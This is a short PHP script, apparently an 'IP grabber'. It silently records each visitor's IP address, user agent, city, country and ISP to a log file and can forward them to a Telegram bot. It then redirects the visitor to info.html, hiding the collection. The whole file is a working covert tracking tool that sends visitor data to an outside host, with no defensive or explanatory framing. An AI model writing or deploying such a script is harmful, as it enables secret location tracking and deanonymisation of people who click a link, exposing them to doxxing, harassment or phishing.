<?php
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$api = "https://ipapi.co/{$ip}/json/";

$info = file_get_contents($api);
$data = json_decode($info, true);

file_put_contents("logs/IPs.txt", "IP: $ip\nLocation: {$data['city']}, {$data['region']}, {$data['country_name']}\nISP: {$data['org']}\nDevice: $ua\n\n", FILE_APPEND);

// Optional: Send to Telegram
$token = "YOUR_TELEGRAM_BOT_TOKEN";
$chat_id = "YOUR_CHAT_ID";
$msg = urlencode("New Visitor:\nIP: $ip\nLocation: {$data['city']}, {$data['country_name']}\nISP: {$data['org']}\nDevice: $ua");
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$msg");

header("Location: info.html");
exit;
?>
